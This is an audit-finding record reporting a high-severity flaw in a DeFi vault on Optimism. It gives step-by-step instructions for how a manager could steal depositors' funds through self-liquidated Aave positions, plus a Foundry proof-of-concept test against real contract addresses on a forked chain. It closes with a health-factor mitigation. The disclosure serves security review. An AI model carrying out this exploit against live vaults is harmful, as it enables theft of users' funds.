# [H] Manager can make the Vault's position in Aave

## Summary
Severity: High
Contest weight: 0.7674
Dataset id: 22933
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The manager can use the Vault's funds to open a risky position in Aave and liquidate it in the next block, this allows the manager to directly steal the user's funds through liquidations. A manager of a Vault can steal funds from the users in a short time by executing the following attack:
1. Swap all of the Vault's funds into one token and deposit it as collateral in Aave.
2. Make a borrow up to the limit.
3. Withdraw the maximum collateral possible until the health factor is very close to 1e18.
4. Wait one block, which would be 2 seconds on Optimism.
5. Liquidate the Vault's position.
The manager can liquidate the loan after just one block because the health factor was at the limit (1e18) and the interest accrued in one block is enough to make that loan liquidatable. Also, the manager will know beforehand that the position will become liquidatable in the exact next block, which will give him the advantage to send the liquidation transaction before all bots do the same. Aave allows the liquidation of a position up to 50%, and the liquidation penalty is usually 5% for most tokens. This means that if the Vault is holding 1M USD, the manager can steal up to 2.5% (5% of 50%) of the Vault's funds each 2 blocks. If we do the math, in 15 minutes the manager would have stolen up to 996,642.33 USD of the initial 1M USD. The manager can steal most of the funds in a short amount of time by opening risky positions in Aave on behalf of the Vault and liquidating them. This impact breaks a restriction imposed in the README: Manager or trader under any circumstances should not be able to take out depositors funds put in the vaults they manage. Moreover, this attack doesn't need any conditions or external states, so I believe it warrants high severity.

## Proof of Concept
The following PoC is a test that forks the Optimism blockchain and executes the attack on a Vault. The test can be pasted in any Foundry environment and can be run with the command forge test --match-test test_liquidation_aave --evm-version cancun. Additionally, you must have the following lines in the .env file in order for the test to fork the blockchain:
OPTIMISM_RPC_URL=https://opt-mainnet.g.alchemy.com/v2/{key}
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;

import {Test} from "forge-std/Test.sol";

interface IPoolLogic {
    function execTransaction(address to, bytes calldata data) external returns (bool success);
}

interface IAavePool {
    function deposit(address, uint256, address, uint16) external;
    function borrow(address, uint256, uint256, uint16, address) external;
    function withdraw(address, uint256, address) external;
    function getUserAccountData(address user) external view returns (uint256, uint256, uint256, uint256, uint256, uint256 healthFactor);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract PoolTest is Test {
    IPoolLogic pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
    address managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
    IAavePool aaveLendingPool = IAavePool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 USDC = IERC20(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
    uint256 opFork;
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");

    function setUp() public {
        // Create Optimism fork
        opFork = vm.createSelectFork(OPTIMISM_RPC_URL);
        assertEq(opFork, vm.activeFork());
        vm.rollFork(121348913); // Jun-13-2024 04:36:43 PM +UTC
    }

    function test_liquidation_aave() public {
        // First, simulate the pool getting 100 WETH
        deal(address(WETH), address(pool), 100e18);
        assertEq(WETH.balanceOf(address(pool)), 100e18);

        // Approve 100 WETH to the Aave lending pool
        bytes memory data = abi.encodeWithSelector(WETH.approve.selector, address(aaveLendingPool), 100e18);

        vm.prank(managerAddress);
        pool.execTransaction(address(WETH), data);

        // Supply 100 WETH to the Aave lending pool
        data = abi.encodeWithSelector(aaveLendingPool.deposit.selector, address(WETH), 100e18, address(pool), 0);

        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);

        // Borrow the maximum USDC possible with the 100 WETH
        data = abi.encodeWithSelector(aaveLendingPool.borrow.selector, address(USDC), 275_000e6, 2, 0, address(pool));

        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);

        // Withdraw the maximum WETH possible
        data = abi.encodeWithSelector(aaveLendingPool.withdraw.selector, address(WETH), 3.5354266145e18, address(pool));

        vm.prank(managerAddress);
        pool.execTransaction(address(aaveLendingPool), data);

        // Fast forward 1 block (Optimism)
        vm.warp(block.timestamp + 2);

        // The position is now liquidatable
        (,,,,, uint256 healthFactor) = aaveLendingPool.getUserAccountData(address(pool));

        assertLt(healthFactor, 1e18);
    }
}
```
The above test shows how a manager can open a risky position in Aave on behalf of the Vault and make it liquidatable in the next Optimism block. After that, the manager only has to liquidate the Vault's position to get the profits. This sequence can be repeated every two blocks to steal almost all of the user's funds.

## Recommendation
To mitigate this issue is recommended to ensure that the health factor has some margin after the Vault has called Aave. For example, it'd be good to always check that the Vault's position has a health factor of at least 1.25 to make sure that the Vault's position is not overly risky.
